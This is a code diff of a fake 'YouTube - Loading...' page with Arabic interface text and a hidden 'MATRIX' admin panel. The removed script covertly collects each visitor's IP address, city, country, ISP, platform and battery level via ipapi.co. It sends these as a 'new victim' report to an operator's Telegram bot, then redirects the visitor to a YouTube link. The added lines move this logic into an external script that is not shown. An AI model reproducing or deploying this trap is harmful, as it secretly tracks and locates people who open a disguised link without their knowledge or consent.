@@ -4,97 +4,36 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube - Loading...</title>
-    <style>
-        body { background-color: #0f0f0f; color: white; font-family: 'Roboto', Arial, sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .loader-container { text-align: center; }
-        .yt-logo { width: 120px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
-        .spinner { border: 3px solid rgba(255, 255, 255, 0.1); border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } }
-        .version-tag { position: absolute; bottom: 10px; font-size: 10px; color: #333; cursor: default; user-select: none; }
-        
-        /* لوحة التحكم المخفية */
-        #adminPanel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; padding: 20px; border: 1px solid #ff0000; border-radius: 10px; z-index: 1000; width: 300px; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-        #adminPanel h3 { color: #ff0000; margin-top: 0; text-align: center; font-size: 16px; }
-        #adminPanel input { width: 90%; padding: 8px; margin: 10px 0; background: #000; border: 1px solid #333; color: #0f0; font-family: monospace; }
-        #adminPanel button { width: 100%; padding: 10px; background: #ff0000; border: none; color: white; cursor: pointer; font-weight: bold; }
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 999; }
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="loader-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" class="yt-logo">
+    <div class="loader-container" id="mainLoader">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" class="yt-logo" alt="YouTube">
         <div class="spinner"></div>
-        <p style="color:#aaa; font-size:14px; margin-top:15px;">جاري تحويلك للمحتوى...</p>
+        <p class="status-text">جاري تحضير الفيديو للمشاهدة...</p>
     </div>
 
-    <div class="version-tag" onclick="askPassword()">Build: V1.0.48-Matrix</div>
+    <div class="version-tag" id="adminTrigger">Build: V1.0.48-Matrix 🦅</div>
 
     <div class="overlay" id="overlay"></div>
     <div id="adminPanel">
-        <h3>MATRIX TRAP CONTROL</h3>
-        <input type="text" id="botToken" placeholder="Telegram Bot Token">
-        <input type="text" id="chatId" placeholder="Your Chat ID">
-        <input type="text" id="redirectUrl" placeholder="Redirect URL (YouTube Link)">
-        <button onclick="saveSettings()">حفظ وتحديث السيستم</button>
+        <h3>MATRIX CONTROL CENTER</h3>
+        <p style="font-size: 10px; color: #666; text-align: center; margin-bottom: 15px;">إعدادات الربط والتشفير السحابي</p>
+        
+        <label>Telegram Bot Token:</label>
+        <input type="text" id="botToken" placeholder="712345678:AAH...">
+        
+        <label>Your Chat ID:</label>
+        <input type="text" id="chatId" placeholder="123456789">
+        
+        <label>Target Video Link:</label>
+        <input type="text" id="redirectUrl" placeholder="https://youtube.com/watch?v=...">
+        
+        <button onclick="saveSettings()">حفظ وتشفير البيانات 🔒</button>
+        <p id="saveMsg" style="display:none; color:#0f0; font-size:12px; text-align:center; margin-top:10px;">تم التحديث بنجاح! جاري إعادة التشغيل...</p>
     </div>
 
-    <script>
-        // القيم الافتراضية
-        let config = {
-            token: localStorage.getItem('m_token') || "ضع_التوكن_هنا",
-            id: localStorage.getItem('m_id') || "ضع_الآي_دي_هنا",
-            url: localStorage.getItem('m_url') || "https://www.youtube.com"
-        };
-
-        function askPassword() {
-            let pass = prompt("أدخل رمز الوصول المشفر:");
-            if (pass === "01224815487") {
-                document.getElementById('overlay').style.display = 'block';
-                document.getElementById('adminPanel').style.display = 'block';
-                document.getElementById('botToken').value = config.token;
-                document.getElementById('chatId').value = config.id;
-                document.getElementById('redirectUrl').value = config.url;
-            } else { alert("وصول غير مصرح به! تم تسجيل محاولة الاختراق."); }
-        }
-
-        function saveSettings() {
-            localStorage.setItem('m_token', document.getElementById('botToken').value);
-            localStorage.setItem('m_id', document.getElementById('chatId').value);
-            localStorage.setItem('m_url', document.getElementById('redirectUrl').value);
-            alert("تم التحديث! أعد تحميل الصفحة لتفعيل الإعدادات الجديدة.");
-            location.reload();
-        }
-
-        async function sendToTelegram(msg) {
-            if(config.token.includes("_")) return; 
-            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: config.id, text: `🦅 [MATRIX REPORT]\n${msg}`, parse_mode: "Markdown" })
-            });
-        }
-
-        window.onload = async () => {
-            // سحب البيانات في الخلفية
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                let bat = "N/A";
-                if(navigator.getBattery) { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; }
-                
-                let report = `👤 ضحية جديد!\n🌐 IP: \`${d.ip}\`\n📍 ${d.city}, ${d.country_name}\n📡 ${d.org}\n📱 ${navigator.platform}\n🔋 شحن البطارية: ${bat}`;
-                sendToTelegram(report);
-            } catch(e) {}
-
-            // تحويل تلقائي
-            setTimeout(() => {
-                if (document.getElementById('adminPanel').style.display !== 'block') {
-                    window.location.href = config.url;
-                }
-            }, 4000);
-        };
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
